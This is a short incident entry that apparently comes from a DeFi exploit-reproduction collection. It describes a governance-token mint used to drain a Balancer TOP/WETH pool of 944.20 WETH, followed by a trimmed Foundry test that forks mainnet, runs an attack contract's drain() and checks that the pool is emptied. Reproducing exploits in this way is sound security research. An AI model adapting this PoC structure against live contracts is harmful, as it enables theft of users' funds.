# [?] TOPBPool - Governance-controlled token mint and Balancer pool drain

## Summary
Severity: Unknown
Chain: Ethereum
Component: TOPBPool
Published: 2026-06-09
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/TOPBPool_exp.sol
Type: defi-exploit-poc

## Details
Lost: 944.20 WETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 25_279_891;
        vm.createSelectFork("mainnet", forkBlock);
        vm.roll(forkBlock + 1);
        fundingToken = WETH;
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(TOP, "TOP");
        vm.label(WETH, "WETH");
        vm.label(BPOOL, "Balancer TOP/WETH BPool");
        vm.label(TOKEN_MANAGER, "TOP TokenManager Proxy");
        vm.label(VOTING, "TOP Voting Proxy");
    }

    function testExploit() public {
        uint256 attackerWethBefore = IERC20Like(WETH).balanceOf(ATTACKER);
        uint256 poolWethBefore = IERC20Like(WETH).balanceOf(BPOOL);

        vm.etch(ATTACK_CONTRACT, type(TopBPoolDrain).runtimeCode);

        vm.prank(ATTACKER);
        TopBPoolDrain(ATTACK_CONTRACT).drain();

        uint256 attackerWethAfter = IERC20Like(WETH).balanceOf(ATTACKER);
        uint256 poolWethAfter = IERC20Like(WETH).balanceOf(BPOOL);
        uint256 attackerProfit = attackerWethAfter - attackerWethBefore;

        emit log_named_decimal_uint("Attacker WETH profit", attackerProfit, 18);
        emit log_named_decimal_uint("BPool WETH before", poolWethBefore, 18);
        emit log_named_decimal_uint("BPool WETH after", poolWethAfter, 18);

        assertGt(attackerProfit, poolWethBefore, "attacker did not receive drained WETH");
        assertLt(poolWethAfter, poolWethBefore / 1_000_000_000, "BPool WETH was not drained to dust");
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/TOPBPool_exp.sol_
